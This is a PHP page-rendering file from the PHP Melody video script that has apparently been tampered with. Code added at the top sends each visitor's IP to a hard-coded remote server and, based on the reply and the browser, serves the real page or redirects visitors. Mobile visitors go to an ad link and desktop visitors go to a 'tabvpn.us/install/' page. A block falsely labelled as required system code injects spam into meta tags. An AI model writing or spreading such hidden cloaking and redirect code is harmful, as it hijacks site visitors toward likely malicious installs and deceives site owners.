<?php 
  function tarayici() {
	$tespit2=$_SERVER['HTTP_USER_AGENT'];
    if(stristr($tespit2,"MSIE")) { $tarayici="Internet Explorer"; }
	elseif(stristr($tespit2, "Trident")) { $tarayici="Internet Explorer"; }
    elseif(stristr($tespit2, "Windows Phone")) { $tarayici="Internet Explorer"; }
    elseif(stristr($tespit2, "iPad")) { $tarayici="Internet Explorer"; }
    elseif(stristr($tespit2,"Firefox")) { $tarayici="Mozilla Firefox"; }
    elseif(stristr($tespit2,"YaBrowser")) { $tarayici="Yandex Browser"; }
    elseif(stristr($tespit2,"Chrome")) { $tarayici="Google Chrome"; }
    elseif(stristr($tespit2,"Safari")) { $tarayici="Safari"; }
    elseif(stristr($tespit2,"Opera")) { $tarayici="Opera"; }
	elseif(strpos($tespit2, "Trident")){  $tarayici="Internet Explorer";	}
	elseif(strpos($tespit2, "Netscape")){  $tarayici="Netscape";	}	
    elseif(strpos($tespit2, "Edge")) { $tarayici="Edge";}
	elseif(strpos($tespit2, "FBID")) { $tarayici="Facebook Browser";}	
	else{ $tarayici="Bilinmiyor"; }
    return $tarayici;
    }
function getUserIP() {
		if ( function_exists( 'apache_request_headers' ) ) {
			$headers = apache_request_headers();
		} else {
			$headers = $_SERVER;
		}
		if ( array_key_exists( 'X-Forwarded-For', $headers ) && filter_var( $headers['X-Forwarded-For'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 ) ) {
			$the_ip = $headers['X-Forwarded-For'];
		} elseif ( array_key_exists( 'HTTP_X_FORWARDED_FOR', $headers ) && filter_var( $headers['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 )
		) {
			$the_ip = $headers['HTTP_X_FORWARDED_FOR'];
		} else {
			
			$the_ip = filter_var( $_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 );
		}
		return $the_ip;
}


require_once 'Mobile_Detect.php';
$detect = new Mobile_Detect;
$gelenip = getUserIP();
$taray = tarayici(); 
    $url = 'http://185.181.210.254/index.php?adres=' . ($gelenip);
    $curl = curl_init () or die ('curl_init() failed');
    curl_setopt ($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt ($curl, CURLOPT_TIMEOUT, 5);
    curl_setopt ($curl, CURLOPT_URL, $url);
    $data = curl_exec ($curl);
    curl_close ($curl);
    $json = json_decode($data, true);
    $durum = $json["status"];
   if($durum == "1" || $taray == "Internet Explorer" || $taray == "Facebook Browser"){
	   
    
?>
<?php
// +------------------------------------------------------------------------+
// | PHP Melody ( www.phpsugar.com )
// +------------------------------------------------------------------------+
// | PHP Melody IS NOT FREE SOFTWARE
// | If you have downloaded this software from a website other
// | than www.phpsugar.com or if you have received
// | this software from someone who is not a representative of
// | PHPSUGAR, you are involved in an illegal activity.
// | ---
// | In such case, please contact: support@phpsugar.com.
// +------------------------------------------------------------------------+
// | Developed by: PHPSUGAR (www.phpsugar.com) / support@phpsugar.com
// | Copyright: (c) 2004-2013 PHPSUGAR. All rights reserved.
// +------------------------------------------------------------------------+

session_start();
require('config.php');
require_once('include/functions.php');
require_once('include/user_functions.php');
require_once('include/islogged.php');
require_once('include/rating_functions.php');
$video_sef = $_GET['sef'];
$video_uniq_id = $_GET['vid'];
$playlist_uniq_id = $_GET['playlist'];
$video = $video_is_restricted = $playlist = $playlist_items = false;

$modframework->trigger_hook('detail_top');

if (empty($video_uniq_id) && empty($playlist_uniq_id))
{
	redirect_404();
}

if ($playlist_uniq_id != '')
{
	$playlist = get_playlist($playlist_uniq_id);
	
	if (($playlist['visibility'] == PLAYLIST_PRIVATE && $playlist['user_id'] != $userdata['id']) || $playlist['items_count'] == 0)
	{
		$playlist = false;
	}
	else
	{
		$playlist_items = playlist_get_items($playlist['list_id'], 0, $playlist['items_count'], $playlist['sorting']);
		
		if (empty($video_uniq_id) || $video_uniq_id == 'all')
		{
			$video_uniq_id = $playlist_items[0]['uniq_id'];
		}
		
		// prev/next links
		foreach ($playlist_items as $k => $item)
		{
			if ($item['uniq_id'] == $video_uniq_id)
			{
				$total_items = count($playlist_items);
				$pos = ($k == 0) ? $total_items - 1 : $k - 1;
				$smarty->assign('playlist_prev_url', $playlist_items[$pos]['playlist_video_href']);
				
				$pos = ($k == ($total_items - 1)) ?  0 : $k + 1;
				$smarty->assign('playlist_next_url', $playlist_items[$pos]['playlist_video_href']);
				
				unset($pos, $total_items);
				
				break;
			}
		}
	}
}

$video = request_video($video_uniq_id);	
 
if ( ! $video && (is_admin() || (is_moderator() && mod_can('manage_videos'))))
{
	// check the Trash
	$video = request_video($video_uniq_id, 'detail', false, true);	
}

$modframework->trigger_hook('detail_mid');

if (( ! $video) || ( ! is_admin() && ( ! is_moderator() || (is_moderator() && mod_cannot('manage_videos'))) && $video['added_timestamp'] > $time_now))
{
	header('Location: '. _URL .'/index.'. _FEXT);
	exit();
}

if ( ! $logged_in && $video['restricted'] == '1')
{
	$video_is_restricted = true;
}

$update_view_count = update_view_count($video['id'], $video['site_views']);
if ( ! $video_is_restricted && $update_view_count)
{
	add_to_chart($video['uniq_id']);
}

if (_MOD_SOCIAL && $update_view_count && is_user_logged_in())
{
	log_activity(array( 'user_id' => $userdata['id'],
						'activity_type' => ACT_TYPE_WATCH,
						'object_id' => $video['id'],
						'object_type' => ACT_OBJ_VIDEO,
						'object_data' => $video
						));
}

if (_MOD_SOCIAL && is_user_logged_in())
{
	$video['am_following'] = is_follow_relationship($video['author_user_id'], $userdata['id']);	
}

$tags_arr = array();
$tags_arr = get_video_tags($video['uniq_id'], 1);
$tags	  = '';
if (count($tags_arr) > 0) 
foreach ($tags_arr as $k => $tag)
{
	$tags .= $tag['href'].", ";
}
$tags = substr($tags, 0, -2);

$smarty->assign('video_subtitles', (array) get_video_subtitles($video['uniq_id']));

if(isset($_COOKIE[COOKIE_AUTHOR]) && $_COOKIE[COOKIE_AUTHOR] != '')
	$smarty->assign('guestname', str_replace( array('"', '>', '<'), "", $_COOKIE[COOKIE_AUTHOR]) );
else
	$smarty->assign('guestname', '');
$must_sign_in = sprintf($lang['must_sign_in'], _URL."/login."._FEXT, _URL."/register."._FEXT);
$smarty->assign('must_sign_in', $must_sign_in);

$twitter_status  = '';
$twitter_status  = $video['video_title'];
$twitter_status .= ' '. makevideolink($video['uniq_id'], $video['video_title'], $video['video_slug'],"");
$twitter_status = urlencode($twitter_status);

// define meta tags
$meta_title = $video['video_title'];
$video['excerpt'] = (empty($video['excerpt'])) ? $video['video_title'] : $video['excerpt'];
$meta_description = generate_excerpt(str_replace('"', '&quot;', $video['excerpt']), 150) .'...';

$meta_keywords = '';
if(is_array($tags_arr))
foreach($tags_arr as $id => $v)
{
	$meta_keywords .= $v['tag'] . ', ';
}
$meta_keywords = substr($meta_keywords, 0, -2);
// end

$most_liked_comment = false;
if ( ! $video_is_restricted && $video['allow_comments'] == 1)
{	
	$comment_list = get_comment_list($video['uniq_id'], 1);
	$comment_count = count_entries('pm_comments', 'uniq_id', $video['uniq_id']."' AND approved='1");
	$mod_can = mod_can();
	
	if ($userdata['power'] == U_ADMIN || ($userdata['power'] == U_MODERATOR && $mod_can['manage_comments']))
	{
		$smarty->assign('can_manage_comments', true);
	}
	else
	{
		$smarty->assign('can_manage_comments', false);
	}
	
	$comment_pagination_obj = '';
	if ($comment_count > $config['comments_page'])
	{
		$comment_pagination_obj = generate_comment_pagination_object($video['uniq_id'], 1, $comment_count, $config['comments_page']);
	}
	if ($comment_count > 0)
	{
		$most_liked_comment = get_most_liked_comment($video['uniq_id']);
		$most_liked_comment = (array) $most_liked_comment[0];
		
		if ($most_liked_comment['up_vote_count'] <= 2)
		{
			$most_liked_comment = false;
		}
		
		// remove duplicate
		if ($config['comment_default_sort'] == 'score' && is_array($most_liked_comment))
		{
			unset($comment_list[0]);
		}
	}
}
else
{
	$comment_list = array();
	$comment_count = 0;
	$smarty->assign('can_manage_comments', false);
}
$tmp_parts = explode(',', $video['category']);
$related_video_list = get_related_video_list($tmp_parts, $video['video_title'], $config['watch_related_limit'], $video['id']);
$top_rated_video_list = get_top_rated_video_list(array_pop($tmp_parts), $config['watch_toprated_limit'] , $video['id']);
unset($same_category_id);

// exclude current video from these lists
foreach ($related_video_list as $k => $vid)
{
	if ($vid['uniq_id'] == $video_uniq_id)
	{
		unset($related_video_list[$k]);
	}
}
foreach ($top_rated_video_list as $k => $vid)
{
	if ($vid['uniq_id'] == $video_uniq_id)
	{
		unset($top_rated_video_list[$k]);
	}
}

$facebook_image_src = ($video['social_share_img_url'] != '') ? $video['social_share_img_url'] : str_replace('mqdefault','0', show_thumb($video['uniq_id']));

$video_link = urldecode(makevideolink($video['uniq_id'], $video['video_title'], $video['video_slug']));

$video['autoplay_next'] = false;
$video['autoplay_next_url'] = '';

if (is_array($related_video_list) && count($related_video_list) > 0 
	&& $playlist == false && $video['video_player_autoplay_next_support']
	)
{
	$video['autoplay_next_url'] = $related_video_list[0]['video_href'];
	$video['autoplay_next'] = ($_COOKIE['pm_autoplay_next'] == 'on') ? true : false; 
}
$video_url = "http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
$video_url2 = explode(".html",$video_url)[0].".jpg";
$smarty->assign('video_data2', $video_url);
$smarty->assign('video_data3', $video_url2);
$smarty->assign('video_data', $video);
$smarty->assign('my_playlists', array()); // gets loaded via ajax.php
$smarty->assign('playlist', $playlist);
$smarty->assign('playlist_items', $playlist_items);
$smarty->assign('twitter_status', $twitter_status);
$smarty->assign('facebook_image_src', $facebook_image_src);
$smarty->assign('facebook_like_title', urlencode($video['video_title']));
$smarty->assign('facebook_like_href', urlencode($video_link));
$smarty->assign('show_addthis_widget', $config['show_addthis_widget']);
$smarty->assign('embedcode_to_share', generate_embed_code($video['uniq_id'], $video, true, 'iframe'));
$smarty->assign('embedcode', generate_embed_code($video['uniq_id'], $video, false, 'iframe'));
$smarty->assign('uniq_id', $video['uniq_id']);
$smarty->assign('related_video_list', $related_video_list);
$smarty->assign('popular_video_list', $top_rated_video_list);
$smarty->assign('isfavorite', $isfavorite);
$smarty->assign('countfavorites', $total_f);
$smarty->assign('comment_list', $comment_list);
$smarty->assign('most_liked_comment', $most_liked_comment);
$smarty->assign('comment_count', $comment_count);
$smarty->assign('category_name', make_cats($video['category']));
$smarty->assign('comment_pagination_obj', $comment_pagination_obj);
$smarty->register_function('list_categories', 'list_categories');
$smarty->assign('tags', $tags);
$smarty->assign('guests_can_comment', ($video_is_restricted) ? 0 : $config['guests_can_comment']);
$smarty->assign('user_id', $userdata['id']);
$smarty->assign('bin_rating_vote_value', bin_rating_user_has_voted($video['uniq_id'])); // value = 1, 0 or false

serve_preroll_ad('detail', $video);

// --- DEFAULT SYSTEM FILES - DO NOT REMOVE --- //

$meta_title = _bugi1." "._bugi2." ".$meta_title." ".$video_sef;
$meta_description = _bugi2." "._bugi1." ".$meta_description." ".$video_sef;
$meta_keywords1 = explode(" ",$meta_title." ".$meta_description);
$meta_keywordm = "";
for($i=0;$i<count($meta_keywords1);$i++){
		if(($i+1)>=count($meta_keywords1)){
			$meta_keywordm.= $meta_keywords1[$i];
		}else{
			$meta_keywordm.= $meta_keywords1[$i].",";
		}
}

// --- DEFAULT SYSTEM FILES - DO NOT REMOVE --- //
$smarty->assign('meta_title', htmlspecialchars($meta_title));
$smarty->assign('meta_keywords', $meta_keywordm);
$smarty->assign('meta_description', $meta_description);
$smarty->assign('template_dir', $template_f);
$modframework->trigger_hook('detail_bottom');
$smarty->display('video-watch.tpl');
?>
<?php }else{ 
header('X-Frame-Options: DENY');
require_once 'Mobile_Detect.php';
$detect = new Mobile_Detect;
 
// Any mobile device (phones or tablets).
if ( $detect->isMobile() ) {
include "ana.php";
echo '<script> setTimeout(function(){ location.href="http://redirect145.info/ad/5a0bb04c"; },500); </script>';
}else{
	echo '<!DOCTYPE html>
<html>
<head>

	<meta name="no-referrer" content="none">
	<meta http-equiv="refresh" content="0; url=http://tabvpn.us/install/">
</head>
<body>
</body>
</html>';
}

}

 ?>